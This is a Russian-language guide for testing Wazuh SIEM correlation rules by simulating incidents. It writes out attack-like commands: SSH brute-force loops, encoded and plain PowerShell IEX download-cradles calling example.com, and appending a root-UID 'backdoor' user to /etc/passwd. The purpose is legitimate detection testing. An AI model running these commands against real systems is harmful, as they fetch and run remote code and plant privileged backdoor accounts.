# Симуляция инцидентов для тестирования

Этот документ содержит пошаговые инструкции для проверки работы всех правил корреляции.

---

## 1. SSH Brute Force (Rule 100001)

**Цель:** Проверить детектирование множественных неудачных попыток входа.

```bash
# С другого хоста выполните:
for i in {1..10}; do
    ssh -o ConnectTimeout=2 -o BatchMode=yes wronguser@TARGET_IP
done
```

**Ожидаемый результат:**
- Rule 100001 (Level 10) — через 2 минуты после 6-й попытки
- IP атакующего автоматически блокируется через Active Response (`firewall-drop`) на 30 минут

**Проверка блокировки:**
```bash
docker exec wazuh.manager iptables -L | grep <SRC_IP>
```

---

## 2. Successful Brute Force (Rule 100002)

**Цель:** Проверить детектирование успешного входа после серии неудач.

```bash
# 1. Сначала 7+ неудачных попыток:
for i in {1..8}; do ssh -o ConnectTimeout=2 wronguser@TARGET_IP; done

# 2. Затем успешный вход (используйте реальные учётные данные):
ssh realuser@TARGET_IP
```

**Ожидаемый результат:**
- Rule 100002 (Level 12) — через 3 минуты
- Оповещение в Telegram

---

## 3. Suspicious PowerShell (Rule 100003)

**Цель:** Проверить детектирование подозрительных PowerShell-команд.

```powershell
# На Windows-агенте выполните от имени Администратора:
powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA
```

**Ожидаемый результат:**
- Rule 100003 (Level 8) — в течение нескольких минут

---

## 4. PowerShell Obfuscation (Rule 100004)

**Цель:** Проверить корреляцию подозрительных PowerShell-сессий.

```powershell
# Выполните 3+ раза с интервалом менее 5 минут:
powershell -Command "IEX (New-Object Net.WebClient).DownloadString('http://example.com/test')"
powershell -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMQAwAA==
powershell -Command "Invoke-Expression 'Get-Process'"
```

**Ожидаемый результат:**
- Rule 100004 (Level 10) — после 3-го срабатывания 100003

---

## 5. /etc/passwd Modified (Rule 100005)

**Цель:** Проверить FIM (File Integrity Monitoring) в реальном времени.

```bash
# На Linux-агенте:
echo "backdoor:x:0:0::/root:/bin/bash" | sudo tee -a /etc/passwd
```

**Ожидаемый результат:**
- Rule 100005 (Level 11) — **мгновенно** (realtime FIM)
- Оповещение в Telegram

**Очистка:**
```bash
sudo sed -i '/backdoor/d' /etc/passwd
```

---

## 6. Mass User Creation (Rule 100006)

**Цель:** Проверить корреляцию массового создания пользователей.

```bash
# На Linux-агенте за 5 минут:
for i in {1..5}; do
    sudo useradd testuser$i
done
```

**Ожидаемый результат:**
- Rule 100006 (Level 10) — после 4-го `useradd`

**Очистка:**
```bash
for i in {1..5}; do sudo userdel testuser$i; done
```

---

## 7. /etc/shadow Modified (Rule 100007)

**Цель:** Проверить детектирование изменения хешей паролей.

```bash
# На Linux-агенте:
sudo passwd root
# Введите новый пароль дважды
```

**Ожидаемый результат:**
- Rule 100007 (Level 11) — мгновенно после изменения `/etc/shadow`

---

## 8. Sudo Anomaly (Rule 100008)

**Цель:** Проверить детектирование аномальной активности sudo.

```bash
# На Linux-агенте выполните 6+ команд за минуту:
for i in {1..6}; do sudo whoami; done
```

**Ожидаемый результат:**
- Rule 100008 (Level 8) — после 5-й команды

---

## Проверка алертов

### В реальном времени
```bash
docker exec -it wazuh.manager tail -f /var/ossec/logs/alerts/alerts.json | jq
```

### Исторические
```bash
docker exec -it wazuh.manager grep "Rule: 10000" /var/ossec/logs/alerts/alerts.log
```

### Через Dashboard
1. Откройте `https://YOUR_SERVER_IP:5601`
2. Перейдите в **Security Events**
3. Примените фильтр:
```
rule.id:(100001 OR 100002 OR 100003 OR 100004 OR 100005 OR 100006 OR 100007 OR 100008)
```

---

## Чек-лист тестирования

| Правило | Тест выполнен | Алерт получен | Telegram | Active Response |
|---------|--------------|---------------|----------|-----------------|
| 100001 SSH Brute Force | ⬜ | ⬜ | ⬜ | ⬜ |
| 100002 Successful Brute Force | ⬜ | ⬜ | ⬜ | ⬜ |
| 100003 Suspicious PowerShell | ⬜ | ⬜ | ⬜ | — |
| 100004 PowerShell Obfuscation | ⬜ | ⬜ | ⬜ | — |
| 100005 /etc/passwd Modified | ⬜ | ⬜ | ⬜ | — |
| 100006 Mass User Creation | ⬜ | ⬜ | ⬜ | — |
| 100007 /etc/shadow Modified | ⬜ | ⬜ | ⬜ | — |
| 100008 Sudo Anomaly | ⬜ | ⬜ | ⬜ | — |
